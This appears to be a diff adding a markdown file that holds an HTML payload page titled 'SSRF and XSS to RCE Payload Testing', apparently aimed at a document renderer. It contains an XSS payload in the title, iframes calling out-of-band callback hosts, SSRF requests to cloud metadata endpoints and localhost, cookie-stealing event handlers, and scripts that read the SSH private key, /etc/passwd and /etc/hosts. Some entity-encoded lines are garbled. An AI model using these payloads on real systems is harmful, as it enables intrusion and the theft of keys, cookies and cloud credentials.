@@ -1,0 +1,211 @@
+---
+title: ""><img src=x onerror=alert()>"
+---
+
+\<!DOCTYPE html\>
+
+\<html lang="en"\>
+
+\<head\>
+
+    \<meta charset="UTF-8"\>
+
+    \<meta name="viewport" content="width=device-width, initial-scale=1.0"\>
+
+    \<title\>SSRF and XSS to RCE Payload Testing\</title\>
+
+    \<style\>
+
+        body {
+
+            font-family: Arial, sans-serif;
+
+            background-color: #f4f4f4;
+
+            color: #333;
+
+            text-align: center;
+
+            margin: 0;
+
+            padding: 0;
+
+        }
+
+        h1 {
+
+            margin-top: 50px;
+
+            color: #d9534f;
+
+        }
+
+        iframe, pre {
+
+            width: 80%;
+
+            height: 200px;
+
+            margin: 20px 0;
+
+            border: 2px solid #d9534f;
+
+            display: block;
+
+            margin-left: auto;
+
+            margin-right: auto;
+
+        }
+
+        .container {
+
+            width: 90%;
+
+            margin: auto;
+
+        }
+
+        .result {
+
+            background-color: #eee;
+
+            padding: 10px;
+
+            border-radius: 5px;
+
+            margin: 20px 0;
+
+            text-align: left;
+
+            white-space: pre-wrap;
+
+        }
+
+    \</style\>
+
+\</head\>
+
+\<body\>
+
+    \<h1\>SSRF and XSS to RCE Payload Testing\</h1\>
+
+    \<div class="container"\>
+
+        \<h2\>SSRF Payloads\</h2\>
+
+        \<iframe src=https://mywjkfbatetzhcrebszf0kore4wvv0r80.oast.fun/\>
+
+		
+
+        \<iframe srcdoc="\<svg onload=confirm(document.domain)\>"\>\</iframe\>
+
+		
+
+		"\>\<iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;https://xss.report/c/mrdott1337&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;"\>
+
+        \<iframe src="http://127.0.0.1:443/server-status"\>\</iframe\>
+
+		
+
+		"\>\<Img Src=OnXSS OnError=prompt(document.cookie)\>
+
+		
+
+		"\>\<iframe src=JaVascRipt:confirm(domain)\>
+
+        \<iframe src=x onerror=confirm("done")\>\</iframe\>
+
+		\<img src=x\>
+
+		"\>\<Img Src=OnXSS OnError=prompt(document.cookie)\>
+
+        \<iframe src="http://metadata.google.internal/computeMetadata/v1/project/project-id"\>\</iframe\>
+
+        \<iframe src="http://169.254.169.254/metadata/instance?api-version=2021-01-01&format=text"\>\</iframe\>
+
+        \<h2\>XSS to RCE Payloads\</h2\>
+
+        \<div class="result"\>
+
+            \<h3\>Retrieve SSH Private Key:\</h3\>
+
+            \<script\>
+
+                x = new XMLHttpRequest();
+
+                x.onload = function() {
+
+                    document.write("\<pre\>" + this.responseText + "\</pre\>");
+
+                };
+
+                [x.open](http://x.open)("GET", "file:///home/reader/.ssh/id_rsa");
+
+                x.send();
+
+            \</script\>
+
+        \</div\>
+
+        \<div class="result"\>
+
+            \<h3\>Retrieve Hosts File:\</h3\>
+
+            \<script\>
+
+                x = new XMLHttpRequest();
+
+                x.onload = function() {
+
+                    document.write("\<pre\>" + this.responseText + "\</pre\>");
+
+                };
+
+                [x.open](http://x.open)('GET', 'file:///etc/hosts');
+
+                x.send();
+
+            \</script\>
+
+        \</div\>
+
+        \<div class="result"\>
+
+            \<h3\>Retrieve passwd File:\</h3\>
+
+            \<script\>
+
+                x = new XMLHttpRequest();
+
+                x.onload = function() {
+
+                    document.write("\<pre\>" + this.responseText + "\</pre\>");
+
+                };
+
+                [x.open](http://x.open)('GET', 'file:///etc/passwd');
+
+                x.send();
+
+            \</script\>
+
+        \</div\>
+
+        \<div class="result"\>
+
+            \<h3\>Print Current URL:\</h3\>
+
+            \<script\>
+
+                document.write("\<pre\>" + document.location.href + "\</pre\>");
+
+            \</script\>
+
+        \</div\>
+
+    \</div\>
+
+\</body\>
+
+\</html\>
